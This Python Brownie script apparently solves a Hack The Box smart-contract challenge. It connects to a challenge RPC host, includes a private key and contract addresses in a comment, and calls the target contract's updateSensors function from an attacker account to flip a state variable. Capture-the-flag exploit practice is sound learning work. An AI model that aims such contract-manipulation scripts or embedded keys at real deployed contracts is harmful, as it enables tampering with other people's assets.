#!/usr/bin/python3
from brownie import Unknown, Setup
from scripts.helpful_scripts import get_account
from colorama import Fore

"""
brownie networks add Ethereum HTB host=http://188.166.152.84:31577 chainid=1337

Private key     :  0x85874638f55ba33fdc1e03f91339dcb7a9bcd3acab096b90c5ee4f2941f1f470
Address         :  0x98A11AB8f4aF9A5E25d13F52BA64B7e2588bE789
Target contract :  0x506fE0E21dc5eB549A5db12fCC20ab8595071c5D
Setup contract  :  0xd70eb3eE766996927539AefF9c54E098445351A5
"""

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def hack(attacker=None):
    un = Unknown.at("0x506fE0E21dc5eB549A5db12fCC20ab8595071c5D")
    st = Setup.at("0xd70eb3eE766996927539AefF9c54E098445351A5")

    # print(un.address)
    print(f"Updated var: {un.updated()}")

    tx = un.updateSensors(10, {"from": attacker})
    tx.wait(1)

    print(f"Updated var: {un.updated()}")


def main():
    hack(get_account())


if __name__ == "__main__":
    main()
